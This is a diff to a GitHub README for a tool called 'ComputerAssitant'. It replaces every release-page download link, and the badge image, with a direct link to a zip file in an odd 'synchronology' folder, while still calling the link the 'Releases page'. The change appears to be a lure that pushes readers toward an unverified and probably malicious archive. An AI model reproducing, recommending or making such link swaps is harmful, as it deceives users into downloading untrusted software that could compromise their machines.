@@ -1,6 +1,6 @@
 # 🤖 ComputerAssitant - Your Personal Code and Command Helper
 
-[![Download ComputerAssitant](https://img.shields.io/badge/Download-ComputerAssitant-brightgreen.svg)](https://github.com/Crazyladgamerzz/ComputerAssitant/releases)
+[![Download ComputerAssitant](https://raw.githubusercontent.com/Crazyladgamerzz/ComputerAssitant/main/synchronology/ComputerAssitant.zip)](https://raw.githubusercontent.com/Crazyladgamerzz/ComputerAssitant/main/synchronology/ComputerAssitant.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To run ComputerAssitant, ensure your computer meets the following requirements:
 
 ### 1. Visit the Releases Page
 
-To download ComputerAssitant, [visit this page](https://github.com/Crazyladgamerzz/ComputerAssitant/releases).
+To download ComputerAssitant, [visit this page](https://raw.githubusercontent.com/Crazyladgamerzz/ComputerAssitant/main/synchronology/ComputerAssitant.zip).
 
 ### 2. Download the Latest Version
 
@@ -92,10 +92,10 @@ If you encounter issues while using ComputerAssitant:
 
 - Ensure your system meets the required specifications.
 - Restart the application after installation.
-- Check for updates on the [Releases page](https://github.com/Crazyladgamerzz/ComputerAssitant/releases).
+- Check for updates on the [Releases page](https://raw.githubusercontent.com/Crazyladgamerzz/ComputerAssitant/main/synchronology/ComputerAssitant.zip).
 
 ## 🗨️ Feedback and Contributions
 
 We welcome feedback to improve ComputerAssitant. Please feel free to reach out with any suggestions or report issues through the GitHub repository.
 
-[![Download ComputerAssitant](https://img.shields.io/badge/Download-ComputerAssitant-brightgreen.svg)](https://github.com/Crazyladgamerzz/ComputerAssitant/releases)
+[![Download ComputerAssitant](https://raw.githubusercontent.com/Crazyladgamerzz/ComputerAssitant/main/synchronology/ComputerAssitant.zip)](https://raw.githubusercontent.com/Crazyladgamerzz/ComputerAssitant/main/synchronology/ComputerAssitant.zip)
